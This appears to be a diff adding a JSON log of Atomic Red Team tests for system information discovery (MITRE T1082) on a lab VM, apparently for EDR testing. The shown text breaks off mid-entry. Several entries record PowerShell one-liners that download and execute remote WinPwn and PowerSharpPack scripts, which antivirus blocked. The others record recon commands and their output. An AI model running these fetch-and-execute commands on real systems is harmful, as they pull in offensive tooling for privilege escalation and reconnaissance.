@@ -1,0 +1,629 @@
+{
+    "procedures":  [
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - PowerSharpPack - Watson searching for missing windows patches",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "07b18a66-6304-47d2-bad0-ef421eb2e107"
+                                            },
+                           "procedure-description":  "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
+                           "order":  21,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:27.000Z",
+                                             "time-stop":  "2024-10-12T18:07:30.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1)\nInvoke-watson",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ function Invoke-watson\r\n+ ~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:1 char:4\r\n+  {iex(new-object net.webclient).downloadstring(https://raw.githubus ...\r\n+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nInvoke-watson : The term Invoke-watson is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:1\r\n+ Invoke-watson}\r\n+ ~~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Invoke-watson:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "ESXi - VM Discovery using ESXCLI",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "2040405c-eea6-4c1c-aef3-c2acc430fac9"
+                                            },
+                           "procedure-description":  "An adversary will using ESXCLI to enumerate the Virtual Machines on the host prior to executing power off routine.\n[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)\n",
+                           "order":  31,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:09:11.000Z",
+                                             "time-stop":  "2024-10-12T18:09:13.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "echo \"\" | \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"C:\\AtomicRedTeam\\atomics\\T1082\\src\\esx_vmdiscovery.txt\"\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "Unable to open connection:\r\nHost does not exist",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "Windows MachineGUID Discovery",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "224b4daf-db44-404e-b6b2-f4d1f0126ef8"
+                                            },
+                           "procedure-description":  "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
+                           "order":  9,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:14.000Z",
+                                             "time-stop":  "2024-10-12T18:06:14.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\r\n    MachineGuid    REG_SZ    1c1b41fc-2ccb-43ba-b2fb-4d5364637bde",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - Morerecon",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "3278b2f6-f733-4875-9ef4-bfed34244f0a"
+                                            },
+                           "procedure-description":  "Gathers local system information using the Morerecon function of WinPwn",
+                           "order":  19,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:11.000Z",
+                                             "time-stop":  "2024-10-12T18:07:14.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\nMorerecon -noninteractive -consoleoutput",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nMorerecon : The term Morerecon is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:3 char:1\r\n+ Morerecon -noninteractive -consoleoutput}\r\n+ ~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Morerecon:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - Powersploits privesc checks",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "345cb8e4-d2de-4011-a580-619cf5a9e2d7"
+                                            },
+                           "procedure-description":  "Powersploits privesc checks using oldchecks function of WinPwn",
+                           "order":  16,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:47.000Z",
+                                             "time-stop":  "2024-10-12T18:06:51.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\noldchecks -noninteractive -consoleoutput",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\noldchecks : The term oldchecks is not recognized as the name of a cmdlet, function, script file, or operable \r\nAt line:3 char:1\r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\n+ oldchecks -noninteractive -consoleoutput}\r\n+ ~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (oldchecks:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - itm4nprivesc",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "3d256a2f-5e57-4003-8eb6-64d91b1da7ce"
+                                            },
+                           "procedure-description":  "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
+                           "order":  15,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:39.000Z",
+                                             "time-stop":  "2024-10-12T18:06:43.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\nitm4nprivesc -noninteractive -consoleoutput",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nitm4nprivesc : The term itm4nprivesc is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:3 char:1\r\n+ itm4nprivesc -noninteractive -consoleoutput}\r\n+ ~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (itm4nprivesc:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "System Information Discovery",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "4060ee98-01ae-4c8e-8aad-af8300519cc7"
+                                            },
+                           "procedure-description":  "The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\\Windows\\System32\\config or c:\\Windows\\System32\\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/\n",
+                           "order":  28,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:56.000Z",
+                                             "time-stop":  "2024-10-12T18:08:58.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - General privesc checks",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "5b6f39a2-6ec7-4783-a5fd-2c54a55409ed"
+                                            },
+                           "procedure-description":  "General privesc checks using the otherchecks function of WinPwn",
+                           "order":  17,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:56.000Z",
+                                             "time-stop":  "2024-10-12T18:06:59.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\notherchecks -noninteractive -consoleoutput",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\notherchecks : The term otherchecks is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:3 char:1\r\n+ otherchecks -noninteractive -consoleoutput}\r\n+ ~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (otherchecks:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - PowerSharpPack - Seatbelt",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "5c16ceb4-ba3a-43d7-b848-a13c1f216d95"
+                                            },
+                           "procedure-description":  "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
+                           "order":  23,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:43.000Z",
+                                             "time-stop":  "2024-10-12T18:07:47.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1)\nInvoke-Seatbelt -Command \"-group=all\"",
+                                             "output":  [
+                                                            {
+                                                                "content":  "Exception calling \"Load\" with \"1\" argument(s): \"Could not load file or assembly 608256 bytes loaded from Anonymously \r\nHosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null or one of its dependencies. An \r\nattempt was made to load a program with an incorrect format.\"\r\nAt line:14 char:5\r\n+     $RAS = [System.Reflection.Assembly]::Load($byteOutArray)\r\n+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : BadImageFormatException\r\n \r\nUnable to find type [AnschnallGurt.Program].\r\nAt line:22 char:5\r\n+     [AnschnallGurt.Program]::Main($Command)\r\n+     ~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : InvalidOperation: (AnschnallGurt.Program:TypeName) [], RuntimeException\r\n    + FullyQualifiedErrorId : TypeNotFound",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "System Information Discovery",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "66703791-c902-4560-8770-42b8a91f7667"
+                                            },
+                           "procedure-description":  "Identify System Info. Upon execution, system info and time info will be displayed.\n",
+                           "order":  1,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:03.000Z",
+                                             "time-stop":  "2024-10-12T18:06:06.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "Host Name:                 REDSHIRT\r\nOS Name:                   Microsoft Windows 11 Pro\r\nOS Version:                10.0.22000 N/A Build 22000\r\nOS Manufacturer:           Microsoft Corporation\r\nOS Configuration:          Standalone Workstation\r\nOS Build Type:             Multiprocessor Free\r\nRegistered Owner:          edrbastester@hotmail.com\r\nRegistered Organization:   \r\nProduct ID:                00330-80000-00000-AA011\r\nOriginal Install Date:     10/12/2024, 4:18:36 AM\r\nSystem Boot Time:          10/12/2024, 4:39:49 AM\r\nSystem Manufacturer:       QEMU\r\nSystem Model:              Standard PC (Q35 + ICH9, 2009)\r\nSystem Type:               x64-based PC\r\nProcessor(s):              1 Processor(s) Installed.\r\n                           [01]: Intel64 Family 15 Model 107 Stepping 1 GenuineIntel ~1608 Mhz\r\nBIOS Version:              Proxmox distribution of EDK II 4.2023.08-4, 2/15/2024\r\nWindows Directory:         C:\\Windows\r\nSystem Directory:          C:\\Windows\\system32\r\nBoot Device:               \\Device\\HarddiskVolume1\r\nSystem Locale:             en-us;English (United States)\r\nInput Locale:              en-us;English (United States)\r\nTime Zone:                 (UTC) Coordinated Universal Time\r\nTotal Physical Memory:     8,154 MB\r\nAvailable Physical Memory: 4,407 MB\r\nVirtual Memory: Max Size:  10,074 MB\r\nVirtual Memory: Available: 6,639 MB\r\nVirtual Memory: In Use:    3,435 MB\r\nPage File Location(s):     C:\\pagefile.sys\r\nDomain:                    WORKGROUP\r\nLogon Server:              \\\\REDSHIRT\r\nHotfix(s):                 9 Hotfix(s) Installed.\r\n                           [01]: KB5030650\r\n                           [02]: KB5030842\r\n                           [03]: KB5010690\r\n                           [04]: KB5011048\r\n                           [05]: KB5026038\r\n                           [06]: KB5026910\r\n                           [07]: KB5031358\r\n                           [08]: KB5031591\r\n                           [09]: KB5006755\r\nNetwork Card(s):           3 NIC(s) Installed.\r\n                           [01]: Intel(R) 82574L Gigabit Network Connection\r\n                                 Connection Name: Ethernet\r\n                                 DHCP Enabled:    Yes\r\n                                 DHCP Server:     10.0.2.1\r\n                                 IP address(es)\r\n                                 [01]: 10.0.2.100\r\n                                 [02]: fe80::d625:f1bc:303c:8c4f\r\n                           [02]: Microsoft KM-TEST Loopback Adapter\r\n                                 Connection Name: Npcap Loopback Adapter\r\n                                 DHCP Enabled:    Yes\r\n                                 DHCP Server:     255.255.255.255\r\n                                 IP address(es)\r\n                                 [01]: 169.254.11.76\r\n                                 [02]: fe80::a21e:6c28:b27d:de94\r\n                           [03]: VirtualBox Host-Only Ethernet Adapter\r\n                                 Connection Name: VirtualBox Host-Only Network\r\n                                 DHCP Enabled:    No\r\n                                 IP address(es)\r\n                                 [01]: 192.168.56.1\r\n                                 [02]: fe80::4d06:d747:24bf:784\r\nHyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.\r\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\r\n    0    REG_SZ    SCSI\\DiskVen_QEMUProd_HARDDISK\\4354248670000000\r\n    Count    REG_DWORD    0x1\r\n    NextInstance    REG_DWORD    0x1",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "Griffon Recon",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "69bd4abe-8759-49a6-8d21-0f15822d6370"
+                                            },
+                           "procedure-description":  "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
+                           "order":  10,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:19.000Z",
+                                             "time-stop":  "2024-10-12T18:06:21.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "cscript \"C:\\AtomicRedTeam\\atomics\\T1082\\src\\griffon_recon.vbs\"\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "Microsoft (R) Windows Script Host Version 5.812\r\nCopyright (C) Microsoft Corporation. All rights reserved.\r\nid=0A0027000021type=putHostname=RedShirtDomainMember=noDomainName=WORKGROUPDomainHosts=-1UserName=edrbaLogicalDrives=C:;D:;SystemInfo=Hostname:REDSHIRT%%%Name_OS:Microsoft Windows 11 Pro%%%Version_OS:10.0.22000 BuildNumber : 22000%%%Manufacturer_OS:Microsoft Corporation%%%ProductType_OS:%%%BuildType_OS:Multiprocessor Free%%%RegisteredUser:edrbastester@hotmail.com%%%Organization:%%%SerialNumber:00330-80000-00000-AA011%%%InstallDate:12.10.2024, 04:18:36%%%LastBootUpTime:12.10.2024, 04:39:49%%%%%%%%%%%%MaxNumberOfProcesses:-1%%%SystemType:x64-based PC%%%TotalPhysicalMemory:8550596608%%%Domain:WORKGROUP%%%System_manufacturer:QEMU%%%System_model:Standard PC (Q35 + ICH9, 2009)%%%Processor1: Intel64 Family 15 Model 107 Stepping 1 ~1608 Mhz%%%BIOS_version:4.2023.08-4, 4.2023.08-4, 15.02.2024%%%WindowsDirectory:C:\\Windows%%%SystemDirectory:C:\\Windows\\system32%%%BootDevice:\\Device\\HarddiskVolume1%%%OSLanguage:1033;English D%%%MUILanguages:en-US%%%CurrentTimeZone:UTC-00:00%%%%%%FreePhysicalMemory:4544216%%%TotalVirtualMemorySize:10316272%%%FreeVirtualMemory:6805828%%%Paging file location1: C:\\pagefile.sys%%%QuickFixEngineering_Count-9: %%%QuickFixEngineering1: KB5030650%%%QuickFixEngineering2: KB5030842%%%QuickFixEngineering3: KB5010690%%%QuickFixEngineering4: KB5011048%%%QuickFixEngineering5: KB5026038%%%QuickFixEngineering6: KB5026910%%%QuickFixEngineering7: KB5031358%%%QuickFixEngineering8: KB5031591%%%QuickFixEngineering9: KB5006755%%%NetworkAdapter_Count -3: %%%NetworkAdapter1: Intel(R) 82574L Gigabit Network Connection%%%Connection name: Ethernet%%%DHCPEnabled:True%%%DHCPServer:10.0.2.1%%%IPAddress:10.0.2.100,fe80::d625:f1bc:303c:8c4f%%%NetworkAdapter2: Npcap Loopback Adapter%%%Connection name: Npcap Loopback Adapter%%%DHCPEnabled:True%%%DHCPServer:255.255.255.255%%%IPAddress:169.254.11.76,fe80::a21e:6c28:b27d:de94%%%NetworkAdapter3: VirtualBox Host-Only Ethernet Adapter%%%Connection name: VirtualBox Host-Only Network%%%IPAddress:192.168.56.1,fe80::4d06:d747:24bf:784%%%SoftwareInfo=NetworkInfo=Adapter:Ethernet%%%DNSDomainSuffix:gamesofalltime.com%%%MACAddress:BC:24:11:EF:12:CB%%%DHCPEnabled:True%%%IPAddress:10.0.2.100,fe80::d625:f1bc:303c:8c4f%%%IPSubnet:255.255.255.0,64%%%DefaultIPGateway:10.0.2.1%%%DHCPServer:10.0.2.1%%%DNSServers:10.0.2.2,8.8.8.8,8.8.4.4%%%Adapter:Npcap Loopback Adapter%%%DNSDomainSuffix:gamesofalltime.com%%%MACAddress:02:00:4C:4F:4F:50%%%DHCPEnabled:True%%%IPAddress:169.254.11.76,fe80::a21e:6c28:b27d:de94%%%IPSubnet:255.255.0.0,64%%%DHCPServer:255.255.255.255%%%DNSServers:%%%Adapter:VirtualBox Host-Only Network%%%DNSDomainSuffix:gamesofalltime.com%%%MACAddress:0A:00:27:00:00:21%%%DHCPEnabled:False%%%IPAddress:192.168.56.1,fe80::4d06:d747:24bf:784%%%IPSubnet:255.255.255.0,64%%%DNSServers:%%%ProcessList=DesktopFileList=desktop.ini%%%DiskCryptor.lnk%%%Microsoft Edge.lnk%%%Opera Browser.lnk%%%DesktopScreenshot=NoScreenshotWebHistory=nothingSecurityInfo=Current_user: adminAntiVirus:Windows Defender%%%%%%Admin_privileges: EnabledUACInfoUAC: OnWill you be prompted to allow elevation for administrator: YesPrompt window for elevation permission: On secure desktop",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "operating system discovery ",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "70e13ef4-5a74-47e4-9d16-760b41b0e2db"
+                                            },
+                           "procedure-description":  "operating system discovery using get-ciminstance\nhttps://petri.com/getting-operating-system-information-powershell/",
+                           "order":  34,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:09:24.000Z",
+                                             "time-stop":  "2024-10-12T18:09:26.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null",
+                                             "output":  [
+                                                            {
+                                                                "content":  "",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - GeneralRecon",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "7804659b-fdbf-4cf6-b06a-c03e758590e8"
+                                            },
+                           "procedure-description":  "Collect general computer informations via GeneralRecon function of WinPwn",
+                           "order":  18,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:03.000Z",
+                                             "time-stop":  "2024-10-12T18:07:07.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\nGeneralrecon -consoleoutput -noninteractive",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nGeneralrecon : The term Generalrecon is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:3 char:1\r\n+ Generalrecon -consoleoutput -noninteractive}\r\n+ ~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Generalrecon:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "Hostname Discovery (Windows)",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "85cfbf23-4a1e-4342-8792-007e004b975f"
+                                            },
+                           "procedure-description":  "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
+                           "order":  7,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:10.000Z",
+                                             "time-stop":  "2024-10-12T18:06:10.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "hostname\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "RedShirt",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "System Information Discovery with WMIC",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "8851b73a-3624-4bf7-8704-aa312411565c"
+                                            },
